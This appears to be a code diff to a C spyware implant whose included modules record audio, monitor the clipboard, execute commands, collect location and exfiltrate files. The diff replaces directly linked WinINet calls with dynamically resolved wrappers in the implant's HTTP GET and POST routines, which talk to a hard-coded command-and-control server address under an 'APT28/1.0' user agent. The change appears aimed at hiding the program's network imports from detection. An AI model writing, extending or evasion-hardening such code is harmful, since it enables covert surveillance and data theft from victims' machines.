@@ -5,6 +5,7 @@
 #include <string.h>
 #include <time.h>
 
+#include "dynamic_linking.h"
 #include "base64.c"
 #include "audio_recorder.c"
 #include "clipboard_monitor.c"
@@ -15,11 +16,6 @@
 #include "command_executor.c"
 #include "location_collector.c"
 #include "file_exfiltrator.c"
-
-#ifdef _WIN32
-#pragma comment(lib, "wininet.lib")
-#pragma comment(lib, "ws2_32.lib")
-#endif
 
 // Global C2 server endpoint variables (set from main)
 char C2_SERVER[256] = "10.49.61.126";  // Default value
@@ -70,54 +66,54 @@ char* http_get_request(const char *server, int port, const char *path) {
         return NULL;
     }
     
-    hInternet = InternetOpenA("APT28/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    hInternet = DynInternetOpenA("APT28/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet) {
         printf("[!] InternetOpen failed\n");
         free(response);
         return NULL;
     }
     
-    hConnect = InternetConnectA(hInternet, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    hConnect = DynInternetConnectA(hInternet, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) {
         printf("[!] InternetConnect failed\n");
-        InternetCloseHandle(hInternet);
+        DynInternetCloseHandle(hInternet);
         free(response);
         return NULL;
     }
     
-    hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL, NULL, 0, 0);
+    hRequest = DynHttpOpenRequestA(hConnect, "GET", path, NULL, NULL, NULL, 0, 0);
     if (!hRequest) {
         printf("[!] HttpOpenRequest failed\n");
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
+        DynInternetCloseHandle(hConnect);
+        DynInternetCloseHandle(hInternet);
         free(response);
         return NULL;
     }
     
-    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
+    if (!DynHttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
         printf("[!] HttpSendRequest failed\n");
-        InternetCloseHandle(hRequest);
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
+        DynInternetCloseHandle(hRequest);
+        DynInternetCloseHandle(hConnect);
+        DynInternetCloseHandle(hInternet);
         free(response);
         return NULL;
     }
     
     // Read response
-    if (!InternetReadFile(hRequest, response, 4096 - 1, &bytes_read)) {
+    if (!DynInternetReadFile(hRequest, response, 4096 - 1, &bytes_read)) {
         printf("[!] InternetReadFile failed\n");
-        InternetCloseHandle(hRequest);
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
+        DynInternetCloseHandle(hRequest);
+        DynInternetCloseHandle(hConnect);
+        DynInternetCloseHandle(hInternet);
         free(response);
         return NULL;
     }
     
     response[bytes_read] = '\0';
     
-    InternetCloseHandle(hRequest);
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hInternet);
+    DynInternetCloseHandle(hRequest);
+    DynInternetCloseHandle(hConnect);
+    DynInternetCloseHandle(hInternet);
     
     return response;
 }
@@ -130,38 +126,38 @@ int http_post_request(const char *server, int port, const char *path, const char
     DWORD data_len = strlen(data);
     char headers[] = "Content-Type: application/json\r\n";
     
-    hInternet = InternetOpenA("APT28/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    hInternet = DynInternetOpenA("APT28/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet) {
         printf("[!] InternetOpen failed\n");
         return 0;
     }
     
-    hConnect = InternetConnectA(hInternet, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    hConnect = DynInternetConnectA(hInternet, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) {
         printf("[!] InternetConnect failed\n");
-        InternetCloseHandle(hInternet);
+        DynInternetCloseHandle(hInternet);
         return 0;
     }
     
-    hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, 0, 0);
+    hRequest = DynHttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, 0, 0);
     if (!hRequest) {
         printf("[!] HttpOpenRequest failed\n");
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
+        DynInternetCloseHandle(hConnect);
+        DynInternetCloseHandle(hInternet);
         return 0;
     }
     
-    if (!HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)data, data_len)) {
+    if (!DynHttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)data, data_len)) {
         printf("[!] HttpSendRequest failed\n");
-        InternetCloseHandle(hRequest);
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
+        DynInternetCloseHandle(hRequest);
+        DynInternetCloseHandle(hConnect);
+        DynInternetCloseHandle(hInternet);
         return 0;
     }
     
-    InternetCloseHandle(hRequest);
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hInternet);
+    DynInternetCloseHandle(hRequest);
+    DynInternetCloseHandle(hConnect);
+    DynInternetCloseHandle(hInternet);
     
     return 1;
 }
